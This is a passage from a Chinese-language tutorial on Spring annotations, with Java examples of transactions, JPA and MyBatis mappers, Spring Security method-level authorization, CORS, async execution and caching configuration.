   <span class="hljs-meta">@Transactional(
       propagation = Propagation.REQUIRED,
       isolation = Isolation.READ_COMMITTED,
       timeout = 30,
       readOnly = false,
       rollbackFor = {OrderException.class, SQLException.class}
   )</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderDTO orderDTO)</span> {
       <span class="hljs-comment">// 订单创建逻辑（增删改操作）</span>
       orderMapper.insert(orderDTO);
       inventoryMapper.deduct(orderDTO.getProductId(), orderDTO.getQuantity());
   }
   <span class="hljs-comment">// 继承类级只读事务</span>
   <span class="hljs-keyword">public</span> OrderDTO <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long orderId)</span> {
       <span class="hljs-keyword">return</span> orderMapper.selectById(orderId);
   }
}
</code></pre>
<h3 data-id="heading-35">2. @EnableTransactionManagement</h3>
<p><code>@EnableTransactionManagement</code> 用于启用 Spring 声明式事务管理，标注在配置类上。</p>
<ul>
<li>核心作用：激活 Spring 的事务注解驱动，自动扫描<code>@Transactional</code>标注的 Bean 并生成代理；</li>
<li>兼容模式：支持 Spring AOP 和 AspectJ 两种代理方式。</li>
</ul>
<p><strong>属性说明：</strong></p>

























<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>proxyTargetClass</td><td>是否使用 CGLIB 代理</td><td>① <code>true</code>：强制 CGLIB 代理（类代理）；② <code>false</code>（默认）：优先 JDK 动态代理（接口代理）</td></tr><tr><td>mode</td><td>事务代理模式</td><td>枚举值：<code>PROXY</code>（默认，Spring AOP 代理）、<code>ASPECTJ</code>（AspectJ 代理，需额外依赖）</td></tr><tr><td>order</td><td>事务切面优先级</td><td>数值越小优先级越高，默认<code>Ordered.LOWEST_PRECEDENCE</code>（最低）</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableTransactionManagement(proxyTargetClass = true)</span> <span class="hljs-comment">// 启用事务管理，使用CGLIB代理</span>
<span class="hljs-meta">@MapperScan("com.example.mapper")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionConfig</span> {
   <span class="hljs-comment">// 配置事务管理器（基于数据源）</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> PlatformTransactionManager <span class="hljs-title function_">transactionManager</span><span class="hljs-params">(DataSource dataSource)</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceTransactionManager</span>(dataSource);
   }
}
</code></pre>
<h2 data-id="heading-36">四、数据访问相关注解</h2>
<p>数据访问注解涵盖 Spring Data JPA、MyBatis 等持久层框架的核心注解，简化数据操作逻辑。</p>
<h3 data-id="heading-37">1. Spring Data JPA 核心注解</h3>
<h4 data-id="heading-38">（1）@RepositoryRestResource</h4>
<p><code>@RepositoryRestResource</code> 用于 Spring Data REST，将 Repository 自动暴露为 RESTful API，无需手动编写 Controller。</p>
<p><strong>属性说明：</strong></p>



































<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>path</td><td>API 路径</td><td>如<code>path = "users"</code>，访问路径<code>/users</code></td></tr><tr><td>collectionResourceRel</td><td>集合资源关系名</td><td>用于 HATEOAS 链接，如<code>collectionResourceRel = "userList"</code></td></tr><tr><td>itemResourceRel</td><td>单个资源关系名</td><td>如<code>itemResourceRel = "user"</code></td></tr><tr><td>exported</td><td>是否暴露 API</td><td>① <code>true</code>（默认）：暴露；② <code>false</code>：不暴露</td></tr><tr><td>excerptProjection</td><td>默认投影</td><td>指定默认返回的字段投影类</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 自动暴露REST API：/users（GET/POST/PUT/DELETE）</span>
<span class="hljs-meta">@RepositoryRestResource(path = "users", collectionResourceRel = "userList")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;User, Long&gt; {
   <span class="hljs-comment">// 自动生成API：/users/search/byName?name=xxx</span>
   <span class="hljs-meta">@RestResource(path = "byName", rel = "findByName")</span>
   List&lt;User&gt; <span class="hljs-title function_">findByNameContaining</span><span class="hljs-params">(<span class="hljs-meta">@Param("name")</span> String name)</span>;
}
</code></pre>
<h4 data-id="heading-39">（2）@Query</h4>
<p><code>@Query</code> 用于自定义 JPQL/SQL 查询，标注在 Repository 方法上。</p>
<p><strong>属性说明：</strong></p>



































<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>查询语句</td><td>JPQL（默认）或 SQL（需配合<code>nativeQuery = true</code>）</td></tr><tr><td>nativeQuery</td><td>是否原生 SQL</td><td>① <code>true</code>：原生 SQL；② <code>false</code>（默认）：JPQL</td></tr><tr><td>countQuery</td><td>计数查询语句</td><td>配合分页查询，返回总条数</td></tr><tr><td>countProjection</td><td>计数投影</td><td>简化计数查询，如<code>countProjection = "id"</code></td></tr><tr><td>namedParameters</td><td>是否支持命名参数</td><td>① <code>true</code>（默认）：支持<code>@Param</code>命名参数；② <code>false</code>：仅支持位置参数</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Product, Long&gt; {
   <span class="hljs-comment">// JPQL查询（参数使用:name）</span>
   <span class="hljs-meta">@Query("SELECT p FROM Product p WHERE p.name LIKE %:name% AND p.price &lt;= :maxPrice")</span>
   List&lt;Product&gt; <span class="hljs-title function_">findByCondition</span><span class="hljs-params">(<span class="hljs-meta">@Param("name")</span> String name, <span class="hljs-meta">@Param("maxPrice")</span> BigDecimal maxPrice)</span>;
   <span class="hljs-comment">// 原生SQL查询</span>
   <span class="hljs-meta">@Query(
       value = "SELECT * FROM product WHERE category_id = ?1 AND stock &gt; 0",
       nativeQuery = true
   )</span>
   List&lt;Product&gt; <span class="hljs-title function_">findAvailableByCategoryId</span><span class="hljs-params">(Long categoryId)</span>;
   <span class="hljs-comment">// 分页+计数查询</span>
   <span class="hljs-meta">@Query(value = "SELECT p FROM Product p WHERE p.createTime &gt;= :startTime",
          countQuery = "SELECT COUNT(p.id) FROM Product p WHERE p.createTime &gt;= :startTime")</span>
   Page&lt;Product&gt; <span class="hljs-title function_">findByCreateTimeAfter</span><span class="hljs-params">(<span class="hljs-meta">@Param("startTime")</span> LocalDateTime startTime, Pageable pageable)</span>;
}
</code></pre>
<h4 data-id="heading-40">（3）@Modifying</h4>
<p><code>@Modifying</code> 配合<code>@Query</code>使用，标识该查询为修改操作（INSERT/UPDATE/DELETE），需在事务中执行。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;User, Long&gt; {
   <span class="hljs-meta">@Modifying</span>
   <span class="hljs-meta">@Query("UPDATE User u SET u.status = :status WHERE u.id IN :ids")</span>
   <span class="hljs-meta">@Transactional</span> <span class="hljs-comment">// 修改操作需事务支持</span>
   <span class="hljs-type">int</span> <span class="hljs-title function_">batchUpdateStatus</span><span class="hljs-params">(<span class="hljs-meta">@Param("status")</span> Integer status, <span class="hljs-meta">@Param("ids")</span> List&lt;Long&gt; ids)</span>;
}
</code></pre>
<h3 data-id="heading-41">2. MyBatis 核心注解</h3>
<h4 data-id="heading-42">（1）@Mapper</h4>
<p><code>@Mapper</code> 标识接口为 MyBatis 映射器接口，MyBatis 会自动扫描并生成代理实现类。</p>
<ul>
<li>替代方案：可通过<code>@MapperScan</code>（配置类注解）批量扫描包下的 Mapper 接口。</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 单个Mapper接口标注</span>
<span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> {
   <span class="hljs-meta">@Select("SELECT * FROM user WHERE id = #{id}")</span>
   User <span class="hljs-title function_">selectById</span><span class="hljs-params">(Long id)</span>;
   <span class="hljs-meta">@Insert("INSERT INTO user(name, age) VALUES(#{name}, #{age})")</span>
   <span class="hljs-meta">@Options(useGeneratedKeys = true, keyProperty = "id")</span> <span class="hljs-comment">// 自动生成主键并回写</span>
   <span class="hljs-type">int</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(User user)</span>;
}
<span class="hljs-comment">// 配置类批量扫描（推荐）</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@MapperScan("com.example.mapper")</span> <span class="hljs-comment">// 扫描该包下所有Mapper接口</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatisConfig</span> {
}
</code></pre>
<h4 data-id="heading-43">（2）MyBatis 查询 / 操作注解</h4>
<p>MyBatis 提供一系列注解替代 XML 映射文件，核心包括：</p>
<ul>
<li><code>@Select</code>：查询操作</li>
<li><code>@Insert</code>：插入操作</li>
<li><code>@Update</code>：更新操作</li>
<li><code>@Delete</code>：删除操作</li>
<li><code>@ResultMap</code>：引用 XML 中的结果映射</li>
<li><code>@Param</code>：指定方法参数名（用于 SQL 中 #{name} 引用）</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderMapper</span> {
   <span class="hljs-comment">// 查询（关联查询，使用@Results映射）</span>
   <span class="hljs-meta">@Select("SELECT o.id, o.order_no, o.user_id, u.name user_name " +
           "FROM order o LEFT JOIN user u ON o.user_id = u.id " +
           "WHERE o.id = #{id}")</span>
   <span class="hljs-meta">@Results({
       @Result(column = "id", property = "id", id = true),
       @Result(column = "order_no", property = "orderNo"),
       @Result(column = "user_id", property = "userId"),
       @Result(column = "user_name", property = "userName")
   })</span>
   OrderVO <span class="hljs-title function_">selectOrderVOById</span><span class="hljs-params">(Long id)</span>;
   <span class="hljs-comment">// 批量插入</span>
   <span class="hljs-meta">@Insert("&lt;script&gt;" +
           "INSERT INTO order(user_id, order_no, amount) " +
           "VALUES" +
           "&lt;foreach collection='list' item='item' separator=','&gt;" +
           "(#{item.userId}, #{item.orderNo}, #{item.amount})" +
           "&lt;/foreach&gt;" +
           "&lt;/script&gt;")</span>
   <span class="hljs-type">int</span> <span class="hljs-title function_">batchInsert</span><span class="hljs-params">(<span class="hljs-meta">@Param("list")</span> List&lt;Order&gt; orderList)</span>;
   <span class="hljs-comment">// 更新</span>
   <span class="hljs-meta">@Update("UPDATE order SET status = #{status} WHERE id = #{id}")</span>
   <span class="hljs-type">int</span> <span class="hljs-title function_">updateStatus</span><span class="hljs-params">(<span class="hljs-meta">@Param("id")</span> Long id, <span class="hljs-meta">@Param("status")</span> Integer status)</span>;
}
</code></pre>
<h2 data-id="heading-44">五、Spring Security 安全相关注解</h2>
<p>Spring Security 注解用于实现权限控制、身份认证相关功能，简化安全配置。</p>
<h3 data-id="heading-45">1. @EnableWebSecurity</h3>
<p><code>@EnableWebSecurity</code> 用于启用 Spring Security 的 Web 安全支持，标注在安全配置类上。</p>
<ul>
<li>核心作用：激活 Spring Security 的自动配置，加载默认安全规则（如登录页面、CSRF 防护等）。</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableWebSecurity</span> <span class="hljs-comment">// 启用Web安全</span>
<span class="hljs-meta">@EnableMethodSecurity</span> <span class="hljs-comment">// 启用方法级权限控制（Spring Security 6+）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> {
   <span class="hljs-comment">// 配置用户认证（内存用户示例）</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> UserDetailsService <span class="hljs-title function_">userDetailsService</span><span class="hljs-params">()</span> {
       <span class="hljs-type">UserDetails</span> <span class="hljs-variable">admin</span> <span class="hljs-operator">=</span> User.withUsername(<span class="hljs-string">"admin"</span>)
               .password(passwordEncoder().encode(<span class="hljs-string">"123456"</span>))
               .roles(<span class="hljs-string">"ADMIN"</span>)
               .build();
       <span class="hljs-type">UserDetails</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> User.withUsername(<span class="hljs-string">"user"</span>)
               .password(passwordEncoder().encode(<span class="hljs-string">"123456"</span>))
               .roles(<span class="hljs-string">"USER"</span>)
               .build();
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryUserDetailsManager</span>(admin, user);
   }
   <span class="hljs-comment">// 密码加密器</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> PasswordEncoder <span class="hljs-title function_">passwordEncoder</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>();
   }
   <span class="hljs-comment">// 配置安全规则</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> SecurityFilterChain <span class="hljs-title function_">securityFilterChain</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception {
       http
           .authorizeHttpRequests(auth -&gt; auth
               .requestMatchers(<span class="hljs-string">"/public/**"</span>).permitAll() <span class="hljs-comment">// 公开路径</span>
               .requestMatchers(<span class="hljs-string">"/admin/**"</span>).hasRole(<span class="hljs-string">"ADMIN"</span>) <span class="hljs-comment">// 仅ADMIN角色可访问</span>
               .anyRequest().authenticated() <span class="hljs-comment">// 其他路径需认证</span>
           )
           .formLogin(form -&gt; form.permitAll()) <span class="hljs-comment">// 启用默认登录页面</span>
           .logout(logout -&gt; logout.permitAll()); <span class="hljs-comment">// 启用注销功能</span>
       <span class="hljs-keyword">return</span> http.build();
   }
}
</code></pre>
<h3 data-id="heading-46">2. @EnableMethodSecurity</h3>
<p><code>@EnableMethodSecurity</code>（Spring Security 6+，替代旧版<code>@EnableGlobalMethodSecurity</code>）用于启用方法级权限控制，支持<code>@PreAuthorize</code>、<code>@PostAuthorize</code>等注解。</p>
<p><strong>属性说明：</strong></p>

























<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>prePostEnabled</td><td>是否启用 @PreAuthorize/@PostAuthorize</td><td>① <code>true</code>（默认）：启用；② <code>false</code>：禁用</td></tr><tr><td>securedEnabled</td><td>是否启用 @Secured</td><td>① <code>true</code>：启用；② <code>false</code>（默认）：禁用</td></tr><tr><td>jsr250Enabled</td><td>是否启用 JSR-250 注解（如 @RolesAllowed）</td><td>① <code>true</code>：启用；② <code>false</code>（默认）：禁用</td></tr></tbody></table>
<h3 data-id="heading-47">3. 方法级权限注解</h3>
<h4 data-id="heading-48">（1）@PreAuthorize</h4>
<p><code>@PreAuthorize</code> 方法执行前进行权限校验，支持 SpEL 表达式，灵活控制访问权限。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceService</span> {
   <span class="hljs-comment">// 仅ADMIN角色可访问</span>
   <span class="hljs-meta">@PreAuthorize("hasRole('ADMIN')")</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteResource</span><span class="hljs-params">(Long id)</span> {
       <span class="hljs-comment">// 删除资源逻辑</span>
   }
   <span class="hljs-comment">// 仅本人或ADMIN可访问（SpEL表达式，#userId为方法参数）</span>
   <span class="hljs-meta">@PreAuthorize("authentication.principal.username == #username or hasRole('ADMIN')")</span>
   <span class="hljs-keyword">public</span> UserDTO <span class="hljs-title function_">getUserInfo</span><span class="hljs-params">(String username)</span> {
       <span class="hljs-comment">// 查询用户信息</span>
   }
   <span class="hljs-comment">// 权限表达式结合自定义方法（需注册Bean：customPermissionEvaluator）</span>
   <span class="hljs-meta">@PreAuthorize("@customPermissionEvaluator.hasPermission(#orderId, authentication)")</span>
   <span class="hljs-keyword">public</span> OrderDTO <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long orderId)</span> {
       <span class="hljs-comment">// 查询订单</span>
   }
}
</code></pre>
<h4 data-id="heading-49">（2）@PostAuthorize</h4>
<p><code>@PostAuthorize</code> 方法执行后进行权限校验，适用于需要根据返回结果判断权限的场景（如数据权限）。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
   <span class="hljs-comment">// 方法执行后校验：返回的订单所属用户与当前登录用户一致</span>
   <span class="hljs-meta">@PostAuthorize("returnObject.userId == authentication.principal.id")</span>
   <span class="hljs-keyword">public</span> OrderDTO <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long orderId)</span> {
       <span class="hljs-keyword">return</span> orderMapper.selectById(orderId);
   }
}
</code></pre>
<h4 data-id="heading-50">（3）@Secured</h4>
<p><code>@Secured</code> 用于基于角色的权限控制，仅支持角色名称（需以<code>ROLE_</code>前缀开头，或配置<code>rolePrefix</code>）。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
   <span class="hljs-comment">// 仅ROLE_ADMIN角色可访问（注意前缀ROLE_）</span>
   <span class="hljs-meta">@Secured("ROLE_ADMIN")</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchDelete</span><span class="hljs-params">(List&lt;Long&gt; ids)</span> {
       userMapper.batchDelete(ids);
   }
   <span class="hljs-comment">// 多角色支持（OR关系）</span>
   <span class="hljs-meta">@Secured({"ROLE_ADMIN", "ROLE_OPERATOR"})</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUserStatus</span><span class="hljs-params">(Long id, Integer status)</span> {
       userMapper.updateStatus(id, status);
   }
}
</code></pre>
<h4 data-id="heading-51">（4）@RolesAllowed（JSR-250）</h4>
<p><code>@RolesAllowed</code> 是 JSR-250 标准注解，功能与<code>@Secured</code>类似，支持角色权限控制。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
   <span class="hljs-comment">// 支持ROLE_USER或ROLE_ADMIN角色</span>
   <span class="hljs-meta">@RolesAllowed({"USER", "ADMIN"})</span>
   <span class="hljs-keyword">public</span> List&lt;ProductDTO&gt; <span class="hljs-title function_">getProductList</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> productMapper.selectAll();
   }
}
</code></pre>
<h3 data-id="heading-52">4. @AuthenticationPrincipal</h3>
<p><code>@AuthenticationPrincipal</code> 用于获取当前登录用户的认证信息（<code>Authentication</code>中的<code>Principal</code>），简化用户信息获取。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/user")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
   <span class="hljs-comment">// 获取当前登录用户的用户名（Principal为String类型）</span>
   <span class="hljs-meta">@GetMapping("/info")</span>
   <span class="hljs-keyword">public</span> Result&lt;UserInfo&gt; <span class="hljs-title function_">getUserInfo</span><span class="hljs-params">(<span class="hljs-meta">@AuthenticationPrincipal</span> String username)</span> {
       <span class="hljs-type">UserInfo</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> userService.getUserByUsername(username);
       <span class="hljs-keyword">return</span> Result.success(userInfo);
   }
   <span class="hljs-comment">// 获取自定义UserDetails对象（需实现UserDetails接口）</span>
   <span class="hljs-meta">@GetMapping("/profile")</span>
   <span class="hljs-keyword">public</span> Result&lt;CustomUserDetails&gt; <span class="hljs-title function_">getProfile</span><span class="hljs-params">(<span class="hljs-meta">@AuthenticationPrincipal</span> CustomUserDetails userDetails)</span> {
       <span class="hljs-keyword">return</span> Result.success(userDetails);
   }
}
</code></pre>
<h3 data-id="heading-53">5. @CrossOrigin</h3>
<p><code>@CrossOrigin</code> 用于解决跨域资源共享（CORS）问题，标注在 Controller 或方法上，允许跨域请求访问。</p>
<ul>
<li>核心场景：前后端分离架构中，前端域名与后端 API 域名不一致时配置；</li>
<li>底层原理：自动添加<code>Access-Control-*</code>响应头，支持预检请求（OPTIONS）。</li>
</ul>
<p><strong>属性说明：</strong></p>








































<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>origins</td><td>允许的跨域源</td><td>数组形式，如<code>origins = {"``https://example.com``", "``http://localhost:8080``"}</code>，<code>*</code>表示允许所有（不推荐生产环境）</td></tr><tr><td>allowedHeaders</td><td>允许的请求头</td><td>数组形式，如<code>allowedHeaders = {"Content-Type", "Authorization"}</code>，<code>*</code>表示允许所有</td></tr><tr><td>methods</td><td>允许的请求方法</td><td>数组形式，如<code>methods = {RequestMethod.GET, RequestMethod.POST}</code>，默认允许所有请求方法</td></tr><tr><td>exposedHeaders</td><td>允许前端访问的响应头</td><td>数组形式，如<code>exposedHeaders = "X-Total-Count"</code>，默认仅暴露基本响应头</td></tr><tr><td>allowCredentials</td><td>是否允许携带 Cookie</td><td>① <code>true</code>：允许（需前端配合设置<code>withCredentials: true</code>）；② <code>false</code>（默认）：不允许</td></tr><tr><td>maxAge</td><td>预检请求缓存时间（秒）</td><td>默认为 1800 秒（30 分钟），减少预检请求次数</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 类级配置：所有方法允许跨域</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api")</span>
<span class="hljs-meta">@CrossOrigin(
   origins = {"https://example.com", "http://localhost:8080"},
   allowedHeaders = "*",
   allowCredentials = true,
   maxAge = 3600
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiController</span> {
   <span class="hljs-comment">// 方法级配置：覆盖类级，仅允许GET/POST方法</span>
   <span class="hljs-meta">@CrossOrigin(methods = {RequestMethod.GET, RequestMethod.POST})</span>
   <span class="hljs-meta">@GetMapping("/data")</span>
   <span class="hljs-keyword">public</span> Result&lt;List&lt;DataDTO&gt;&gt; <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> Result.success(dataService.list());
   }
}
</code></pre>
<h2 data-id="heading-54">六、其他常用核心注解</h2>
<h3 data-id="heading-55">1. 异步相关注解</h3>
<h4 data-id="heading-56">（1）@EnableAsync</h4>
<p><code>@EnableAsync</code> 用于启用 Spring 异步方法支持，标注在配置类上。</p>
<ul>
<li>核心作用：激活 Spring 对<code>@Async</code>注解的识别，通过线程池执行异步方法。</li>
</ul>
<p><strong>属性说明：</strong></p>

























<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>proxyTargetClass</td><td>是否使用 CGLIB 代理</td><td>① <code>true</code>：类代理；② <code>false</code>（默认）：接口代理</td></tr><tr><td>mode</td><td>代理模式</td><td><code>PROXY</code>（默认）或<code>ASPECTJ</code>（需额外依赖）</td></tr><tr><td>order</td><td>异步切面优先级</td><td>数值越小优先级越高，默认最低</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableAsync(proxyTargetClass = true)</span> <span class="hljs-comment">// 启用异步支持</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncConfig</span> {
   <span class="hljs-comment">// 配置自定义线程池（推荐）</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> Executor <span class="hljs-title function_">taskExecutor</span><span class="hljs-params">()</span> {
       <span class="hljs-type">ThreadPoolTaskExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolTaskExecutor</span>();
       executor.setCorePoolSize(<span class="hljs-number">5</span>); <span class="hljs-comment">// 核心线程数</span>
       executor.setMaxPoolSize(<span class="hljs-number">10</span>); <span class="hljs-comment">// 最大线程数</span>
       executor.setQueueCapacity(<span class="hljs-number">20</span>); <span class="hljs-comment">// 队列容量</span>
       executor.setKeepAliveSeconds(<span class="hljs-number">60</span>); <span class="hljs-comment">// 空闲线程存活时间</span>
       executor.setThreadNamePrefix(<span class="hljs-string">"Async-"</span>); <span class="hljs-comment">// 线程名前缀</span>
       executor.setRejectedExecutionHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy()); <span class="hljs-comment">// 拒绝策略</span>
       executor.initialize();
       <span class="hljs-keyword">return</span> executor;
   }
}
</code></pre>
<h4 data-id="heading-57">（2）@Async</h4>
<p><code>@Async</code> 标注方法为异步方法，Spring 会通过线程池异步执行（非当前线程阻塞）。</p>
<ul>
<li>异步方法不能在同一个类中调用（代理失效，如事务失效）；</li>
<li>无返回值用<code>void</code>，有返回值用<code>Future&lt;T&gt;</code>或<code>CompletableFuture&lt;T&gt;</code>。</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncService</span> {
   <span class="hljs-comment">// 无返回值异步方法</span>
   <span class="hljs-meta">@Async("taskExecutor")</span> <span class="hljs-comment">// 指定线程池（对应AsyncConfig中的Bean名称）</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendNotice</span><span class="hljs-params">(Long userId, String content)</span> {
       <span class="hljs-comment">// 异步执行：发送短信/邮件通知（无返回值）</span>
       noticeClient.send(userId, content);
   }
   <span class="hljs-comment">// 有返回值异步方法（CompletableFuture支持链式调用）</span>
   <span class="hljs-meta">@Async</span>
   <span class="hljs-keyword">public</span> CompletableFuture&lt;Boolean&gt; <span class="hljs-title function_">exportData</span><span class="hljs-params">(String condition)</span> {
       <span class="hljs-comment">// 异步执行：数据导出逻辑</span>
       <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> exportService.doExport(condition);
       <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(success);
   }
}
<span class="hljs-comment">// 调用示例</span>
<span class="hljs-meta">@Controller</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExportController</span> {
   <span class="hljs-meta">@Autowired</span>
   <span class="hljs-keyword">private</span> AsyncService asyncService;
   <span class="hljs-meta">@GetMapping("/export")</span>
   <span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title function_">export</span><span class="hljs-params">(String condition)</span> {
       CompletableFuture&lt;Boolean&gt; future = asyncService.exportData(condition);
       future.whenComplete((success, ex) -&gt; {
           <span class="hljs-keyword">if</span> (success) {
               <span class="hljs-comment">// 导出成功回调</span>
           } <span class="hljs-keyword">else</span> {
               <span class="hljs-comment">// 导出失败处理</span>
           }
       });
       <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"导出任务已启动，请稍后查看结果"</span>);
   }
}
</code></pre>
<h3 data-id="heading-58">2. 缓存相关注解</h3>
<h4 data-id="heading-59">（1）@EnableCaching</h4>
<p><code>@EnableCaching</code> 用于启用 Spring 缓存支持，标注在配置类上。</p>
<ul>
<li>核心作用：激活 Spring 对缓存注解（<code>@Cacheable</code>、<code>@CachePut</code>等）的识别，整合第三方缓存（如 Redis、Caffeine）。</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableCaching</span> <span class="hljs-comment">// 启用缓存支持</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheConfig</span> {
   <span class="hljs-comment">// 配置Redis缓存管理器（需引入spring-boot-starter-data-redis依赖）</span>
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> RedisCacheManager <span class="hljs-title function_">cacheManager</span><span class="hljs-params">(RedisConnectionFactory connectionFactory)</span> {
       <span class="hljs-type">RedisCacheConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> RedisCacheConfiguration.defaultCacheConfig()
               .entryTtl(Duration.ofMinutes(<span class="hljs-number">30</span>)) <span class="hljs-comment">// 默认缓存过期时间30分钟</span>
               .serializeKeysWith(RedisSerializationContext.SerializationPair
                       .fromSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>()))
               .serializeValuesWith(RedisSerializationContext.SerializationPair
                       .fromSerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericJackson2JsonRedisSerializer</span>()));
